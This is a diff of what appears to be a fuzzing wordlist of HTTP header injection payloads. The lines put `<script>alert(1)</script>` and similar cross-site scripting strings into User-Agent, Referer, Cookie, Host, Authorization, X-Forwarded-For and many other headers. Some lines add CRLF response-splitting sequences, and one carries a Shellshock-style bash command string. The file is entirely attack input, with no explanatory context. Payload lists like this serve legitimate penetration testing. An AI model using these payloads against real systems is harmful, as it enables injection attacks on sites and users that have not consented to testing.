@@ -1,1 +1,37 @@
-value%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
+X-Forwarded-For: 127.0.0.1
+Content-Type: text/html
+
+<script>alert(1)</script>
+X-Forwarded-For: 127.0.0.1%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>
+User-Agent: <script>alert(1)</script>
+User-Agent: "><script>alert(1)</script>
+User-Agent: () { :;}; echo; /bin/bash -c '<script>alert(1)</script>'
+Referer: "><script>alert(1)</script>
+Referer: javascript:alert(1)
+Accept-Language: "><script>alert(1)</script>
+Cookie: name="><script>alert(1)</script>
+Cookie: session=<script>alert(1)</script>
+X-Custom-Header: <script>alert(1)</script>
+X-Custom-Header: "><img src=x onerror=alert(1)>
+Host: "><script>alert(1)</script>
+Host: evil.com"><script>alert(1)</script>
+X-Forwarded-Host: "><script>alert(1)</script>
+X-Original-URL: "><script>alert(1)</script>
+X-Rewrite-URL: "><script>alert(1)</script>
+Content-Type: "><script>alert(1)</script>
+Content-Disposition: "><script>alert(1)</script>
+Authorization: Bearer <script>alert(1)</script>
+X-Auth-Token: <script>alert(1)</script>
+X-Api-Key: <script>alert(1)</script>
+CF-Connecting-IP: <script>alert(1)</script>
+True-Client-IP: <script>alert(1)</script>
+X-Real-IP: <script>alert(1)</script>
+Origin: "><script>alert(1)</script>
+Origin: <script>alert(1)</script>
+X-Forwarded-For: <script>alert(1)</script>
+Pragma: "><script>alert(1)</script>
+Via: <script>alert(1)</script>
+Forwarded: for=<script>alert(1)</script>
+X-HTTP-Method-Override: <script>alert(1)</script>
+If-Modified-Since: <script>alert(1)</script>
+X-Requested-With: <script>alert(1)</script>
